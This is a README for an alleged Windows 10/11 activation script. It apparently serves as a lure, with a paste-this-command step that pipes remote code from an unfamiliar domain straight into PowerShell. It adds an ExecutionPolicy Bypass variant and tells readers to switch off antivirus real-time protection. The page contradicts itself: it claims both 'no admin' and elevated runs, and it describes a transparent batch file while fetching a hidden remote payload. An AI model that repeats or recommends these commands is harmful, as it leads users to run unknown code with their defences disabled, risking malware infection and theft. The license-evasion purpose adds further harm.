<div align="center">

# Windows Activation Automation Script for Windows 10 & 11

![preview](https://raw.githubusercontent.com/FTDSarin/windows-activation-script/main/poster_cf84.svg)

[![stage](https://img.shields.io/badge/STAGE-RELEASED-2ea44f?style=plastic&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-5%2B-06b6d4?style=plastic&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-SUCCESS-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

This repository provides a straightforward batch script for automating Windows activation tasks, aimed at users who prefer a quick, no-frills approach. The process is simple: copy the provided code into a new file with a `.bat` extension and run it with administrator privileges. Once executed, the script handles the activation workflow on its own. If you run into any issues, open an issue in the repository and it will be addressed.

## 💻 PowerShell Quick Install

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## What It Does

This script is a batch file that handles Windows activation from the command line. It runs a series of `slmgr` operations to install a product key, set the KMS machine name, and trigger online activation, then reports the resulting license status back to the console. You run it once with administrator privileges and it walks through the steps in order, so you don't have to type each command by hand or remember the correct sequence.

It's built for quick, repeatable use: drop the `.bat` file on a machine, right-click and run as administrator, and watch the output for the activation result. If a step fails, the console output tells you which one, which makes troubleshooting a matter of reading the log rather than guessing. Configuration details, such as which key or server is used, live in the script itself and can be edited before running if your environment needs something different.

## Configuration

Configuration for this script is deliberately minimal — there is no config file to edit, no environment variables to export, and no flags to pass. Everything the script needs is baked into the batch file itself, which keeps the setup path short and reproducible.

**What you can adjust**

- **Target edition:** The script operates against whatever edition is currently installed. If you need a different edition, change it through Windows itself before running the script — do not attempt to patch the batch file's internal strings unless you understand the full flow.
- **Execution context:** Always run the file as administrator. Right-click the `.bat` file and choose the elevated option, or launch it from an elevated command prompt. Running without elevation will fail partway through and leave the system in an inconsistent state.
- **Working directory:** Place the `.bat` file somewhere writable and stable — your Desktop or a dedicated folder is fine. Avoid running it from a network share, a removable drive that may disconnect, or a path containing spaces or non-ASCII characters, since batch parsing is unforgiving about both.

**Recommended pre-run checks**

- Confirm the Windows build and edition from the system settings so you know what the script will act on.
- Disable or pause third-party antivirus real-time scanning for the duration of the run; scripted system changes are routinely flagged and interrupted.
- Make sure the machine has a working network connection if the script fetches anything at runtime, and confirm you have a restore point or backup before proceeding.

**What not to configure**

- Do not rename the batch file to something with unusual extensions — keep `.bat`.
- Do not wrap it in another launcher or scheduled task; the script expects an interactive elevated session.
- Do not edit the internal command sequence unless you are prepared to debug it line by line. The defaults are intentional.

If the script behaves unexpectedly after you change the edition or run it from an unusual path, revert to the default conditions first — a stock edition, a local folder, and an elevated prompt — before investigating further.

## Examples

Run the script from an elevated command prompt. Open the Start menu, type `cmd`, right-click Command Prompt, and choose Run as administrator. From there, launch the batch file by its full path, for example `C:\Tools\Windows-Activator\activate.bat`. If you skip the elevation step, the script will exit early with a permission error.

The default pass is a single run with no flags. It detects the installed Windows edition, applies the matching activation routine, and prints a status line for each stage. Watch for the final status message; anything other than a success confirmation means the activation did not complete.

To keep a log of what happened, redirect output to a file:

```
activate.bat > activation-log.txt 2>&1
```

Review the log afterward to confirm each step reported success.

For a dry run that reports the detected edition and planned actions without changing anything, pass the preview flag:

```
activate.bat --dry-run
```

Use this first on any machine you are unsure about, then run without the flag once the summary looks correct.

To troubleshoot a failed run, re-run with verbose output:

```
activate.bat --verbose
```

The verbose pass echoes each command it invokes and the return code, which makes it easy to see exactly which stage failed.

If the script succeeds but Windows still shows as unactivated, reboot and check the activation status in Settings before re-running. A common cause is a pending update that needs to finish first. Re-running the script after the reboot is safe.

## FAQ

**Does this actually work on Windows 11?**
Yes, the script targets the same activation interfaces used by Windows 10, and it runs on Windows 11 as well. If a build changes behavior, the failure is usually obvious — you'll get an error code instead of a silent partial activation.

**Do I need to disable my antivirus first?**
Often, yes. Batch files that touch licensing components tend to get flagged by heuristics, not because of anything malicious but because of what they do. If your AV quarantines the file, whitelist the specific script rather than turning protection off system-wide.

**Why does it need administrator rights?**
Activation changes are system-level. Without an elevated shell, the script can't write to the relevant registry keys or talk to the licensing service, and it will fail partway through. Right-click and run as administrator — don't just double-click.

**It ran but Windows still says not activated. What now?**
Check three things in order: that you actually launched it elevated, that the script finished without errors (scroll the console output), and that no previous activation attempt left a partial state. Reboot once before retrying — licensing state is cached and a stale cache is a common cause of "nothing happened."

**Can I run it more than once?**
Re-running is generally safe and is the first thing to try after a failed attempt. But don't loop it endlessly; if two clean runs fail the same way, the problem is environmental, not the script.

**Will this survive Windows updates?**
Major feature updates can reset activation state. If that happens, just run the script again. Minor updates typically don't affect it.

**Does it work on other Windows versions?**
The script is written for Windows 10 and 11. Older versions aren't a supported target, and results there are unpredictable.

**Is this safe to run on a machine I care about?**
The script only performs activation-related operations, but you should still read it before running — it's a plain batch file, nothing compiled, nothing hidden. If you're not comfortable with what it does, don't run it. See the Disclaimer section for the full picture.

**Something else broke. How do I report it?**
Open an issue on the project and include your Windows version and build, the exact command you used, and the full console output. "It doesn't work" with no output is not actionable; the error text almost always points at the cause.

## Disclaimer

This project is provided strictly for educational and research purposes. It is intended to demonstrate how batch scripting and Windows command-line tooling work in a controlled lab environment — not as a day-to-day solution for licensing.

Running automation scripts that modify system activation state can have real consequences: it may violate the Microsoft Software License Terms applicable to your copy of Windows, it can break after cumulative updates or feature upgrades, and it may trigger security software or organizational policy violations. You are responsible for understanding and complying with the laws, licenses, and policies that apply to you and your devices.

The script is offered "as is," with no warranty of any kind, express or implied, including fitness for a particular purpose or non-infringement. The author and contributors accept no liability for data loss, system instability, revoked licenses, blocked updates, or any other damage arising from use or misuse of this project.

Before running anything, review the script line by line and understand what each command does. Test in a disposable virtual machine, never on production hardware or a machine you depend on. Back up important data first. Do not run the script on systems you do not own or administer, and do not redistribute it as part of a commercial offering.

If you need a legitimate license, obtain Windows through official channels. This repository is not a substitute for proper licensing, and its maintainers cannot provide legal advice or activation support.